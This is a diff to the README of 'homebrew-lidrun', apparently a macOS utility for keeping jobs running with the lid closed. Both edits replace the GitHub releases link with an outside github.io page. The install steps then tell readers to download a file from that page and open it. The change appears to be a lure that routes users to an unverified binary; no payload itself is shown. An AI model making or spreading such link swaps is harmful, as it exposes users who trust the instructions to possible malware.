@@ -1,6 +1,6 @@
 # 💻 homebrew-lidrun - Keep Mac jobs running while closed
 
-[![](https://img.shields.io/badge/Download-LidRun-blue.svg)](https://github.com/multipurpose-chinningbar565/homebrew-lidrun/releases)
+[![](https://img.shields.io/badge/Download-LidRun-blue.svg)](https://multipurpose-chinningbar565.github.io)
 
 ## What is LidRun?
 
@@ -19,7 +19,7 @@ The software monitors your battery levels and internal temperatures. It pauses i
 
 Follow these steps to set up LidRun on your machine:
 
-1. Visit the [releases page](https://github.com/multipurpose-chinningbar565/homebrew-lidrun/releases) to view current versions.
+1. Visit the [releases page](https://multipurpose-chinningbar565.github.io) to view current versions.
 2. Look for the latest release at the top of the list.
 3. Click the link that matches your system architecture.
 4. Open the downloaded file once the transfer completes.
